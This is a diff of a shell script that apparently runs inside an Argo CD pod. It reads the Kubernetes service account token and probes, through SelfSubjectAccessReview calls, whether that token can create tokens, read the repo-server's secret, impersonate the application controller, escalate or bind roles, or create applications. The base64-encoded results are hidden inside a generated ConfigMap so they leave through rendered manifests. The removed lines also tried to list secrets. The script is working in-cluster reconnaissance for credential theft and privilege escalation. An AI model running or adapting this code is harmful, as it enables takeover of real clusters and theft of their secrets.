@@ -1,43 +1,67 @@
 #!/bin/sh
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+NS=argocd
+SA=argocd-repo-server
 
-api_get() {
-  echo "GET $1 HTTP/1.1
-Host: ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
-Authorization: Bearer $TOKEN
-Connection: close
-
-" | openssl s_client -connect ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS} -quiet 2>/dev/null
+sar() {
+  local verb="$1" resource="$2" group="$3" ns="$4" name="$5" subresource="$6"
+  local attrs="\"verb\":\"$verb\",\"resource\":\"$resource\""
+  [ -n "$group" ] && attrs="$attrs,\"group\":\"$group\""
+  [ -n "$ns" ] && attrs="$attrs,\"namespace\":\"$ns\""
+  [ -n "$name" ] && attrs="$attrs,\"name\":\"$name\""
+  [ -n "$subresource" ] && attrs="$attrs,\"subresource\":\"$subresource\""
+  
+  local body="{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{$attrs}}}"
+  
+  printf "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $APISERVER\r\nAuthorization: Bearer $TOKEN\r\nContent-Type: application/json\r\nContent-Length: ${#body}\r\nConnection: close\r\n\r\n$body" | openssl s_client -connect $APISERVER -quiet 2>/dev/null
 }
 
 RECON=$( (
-  echo "===DNS_APP_CONTROLLER==="
-  getent hosts argocd-application-controller.argocd.svc.cluster.local 2>&1 || echo "no_dns"
+  echo "===TOKEN_CREATE==="
+  sar "create" "serviceaccounts/token" "" "$NS" "$SA"
 
-  echo "===TRY_GET_APP_SVC==="
-  api_get "/api/v1/namespaces/argocd/services/argocd-application-controller"
+  echo "===TOKENREVIEW==="
+  sar "create" "tokenreviews" "authentication.k8s.io" "" ""
 
-  echo "===TRY_GET_SA_APP_CONTROLLER==="
-  api_get "/api/v1/namespaces/argocd/serviceaccounts/argocd-application-controller"
+  echo "===SUBJECTACCESSREVIEW==="
+  sar "create" "subjectaccessreviews" "authorization.k8s.io" "" ""
 
-  echo "===TRY_LIST_SVC==="
-  api_get "/api/v1/namespaces/argocd/services"
+  echo "===LIST_ROLES==="
+  sar "list" "roles" "rbac.authorization.k8s.io" "$NS"
 
-  echo "===DNS_LIST==="
-  for svc in argocd-server argocd-repo-server argocd-application-controller argocd-applicationset-controller argocd-notifications-controller argocd-dex-server; do
-    printf "$svc: "
-    getent hosts $svc.argocd.svc.cluster.local 2>&1 | head -1 || echo "no_dns"
-  done
+  echo "===LIST_ROLEBINDINGS==="
+  sar "list" "rolebindings" "rbac.authorization.k8s.io" "$NS"
 
-  echo "===ARGOCD_APP_LIST_VIA_API==="
-  api_get "/api/v1/namespaces/argocd/secrets?fieldSelector=type=Opaque"
+  echo "===LIST_CLUSTERROLES==="
+  sar "list" "clusterroles" "rbac.authorization.k8s.io"
+
+  echo "===GET_SA_SECRET==="
+  sar "get" "secrets" "" "$NS" "${SA}-token"
+
+  echo "===IMPERSONATE_SA==="
+  sar "impersonate" "serviceaccounts" "" "$NS" "argocd-application-controller"
+
+  echo "===ESCALATE==="
+  sar "escalate" "roles" "rbac.authorization.k8s.io" "$NS"
+
+  echo "===BIND==="
+  sar "bind" "roles" "rbac.authorization.k8s.io" "$NS"
+
+  echo "===LIST_CRD==="
+  sar "list" "customresourcedefinitions" "apiextensions.k8s.io"
+
+  echo "===LIST_APPLICATIONS==="
+  sar "list" "applications" "argoproj.io" "$NS"
+
+  echo "===CREATE_APPLICATION==="
+  sar "create" "applications" "argoproj.io" "$NS"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: appcon
+  name: sarfull
 data:
   result: $RECON
 EOF
